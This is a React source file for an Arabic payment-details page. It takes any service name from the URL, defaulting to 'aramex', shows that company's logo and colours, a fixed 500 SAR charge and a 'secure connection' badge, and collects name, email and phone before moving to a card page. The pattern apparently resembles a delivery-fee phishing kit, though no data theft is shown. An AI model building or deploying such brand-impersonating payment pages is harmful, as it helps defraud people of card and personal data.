import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { CreditCard, Shield, ArrowLeft, Info, User, Mail, Phone } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  
  // For demo, get service from URL or use default
  const serviceName = new URLSearchParams(window.location.search).get('service') || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  const handleProceed = (e: React.FormEvent) => {
    e.preventDefault();
    // Store customer info in sessionStorage
    sessionStorage.setItem('customerInfo', JSON.stringify({
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      service: serviceName
    }));
    navigate(`/pay/${id}/card`);
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceName={serviceName}
        amount="500 ر.س"
        title={`الدفع - ${serviceName}`}
        description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      />
      <div 
        className="min-h-screen py-4 sm:py-12" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="max-w-2xl mx-auto">
          {/* Service Logo */}
          {branding.logo && (
            <div className="text-center mb-4 sm:mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-10 sm:h-16 mx-auto mb-2 sm:mb-4"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Security Badge */}
          <div className="text-center mb-3 sm:mb-6">
            <Badge 
              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2"
              style={{ 
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                color: 'white'
              }}
            >
              <Shield className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
              <span>اتصال آمن ومشفّر</span>
            </Badge>
          </div>
          
          <Card className="p-4 sm:p-8 shadow-elevated">
            <form onSubmit={handleProceed}>
              {/* Header */}
              <div className="flex items-start justify-between mb-4 sm:mb-8">
                <div>
                  <h1 className="text-lg sm:text-2xl font-bold mb-1 sm:mb-2">تفاصيل الدفع</h1>
                  <p className="text-xs sm:text-base text-muted-foreground">
                    خدمة: {serviceName}
                  </p>
                </div>
                
                <div
                  className="w-12 h-12 sm:w-16 sm:h-16 rounded-lg sm:rounded-xl flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                  }}
                >
                  <CreditCard className="w-6 h-6 sm:w-8 sm:h-8 text-white" />
                </div>
              </div>
              
              {/* Customer Info */}
              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                <div>
                  <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                    <User className="w-3 h-3 sm:w-4 sm:h-4" />
                    الاسم الكامل
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-10 sm:h-12 text-sm sm:text-base"
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>
                
                <div>
                  <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                    <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                    البريد الإلكتروني
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-10 sm:h-12 text-sm sm:text-base"
                    placeholder="example@email.com"
                  />
                </div>
                
                <div>
                  <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                    <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                    رقم الهاتف
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-10 sm:h-12 text-sm sm:text-base"
                    placeholder="+966 5X XXX XXXX"
                  />
                </div>
              </div>
            
              {/* Payment Summary */}
              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
                  <span className="text-muted-foreground">الخدمة</span>
                  <span className="font-semibold">{serviceName}</span>
                </div>
                
                <div 
                  className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
                  }}
                >
                  <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
                  <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
                    500 ر.س
                  </span>
                </div>
              </div>
            
              {/* Payment Method */}
              <div className="mb-6 sm:mb-8">
                <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">طريقة الدفع</h3>
                <div 
                  className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4"
                  style={{
                    borderColor: branding.colors.primary,
                    background: `${branding.colors.primary}10`
                  }}
                >
                  <div className="flex items-center gap-2 sm:gap-3">
                    <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
                    <div>
                      <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
                      <p className="text-xs sm:text-sm text-muted-foreground">
                        Visa، Mastercard، Mada
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Proceed Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <span className="ml-2">الدفع بالبطاقة</span>
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
              </Button>
            
              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                بالمتابعة، أنت توافق على الشروط والأحكام
              </p>
            </form>
          </Card>
        </div>
      </div>
      </div>
    </>
  );
};

export default PaymentDetails;
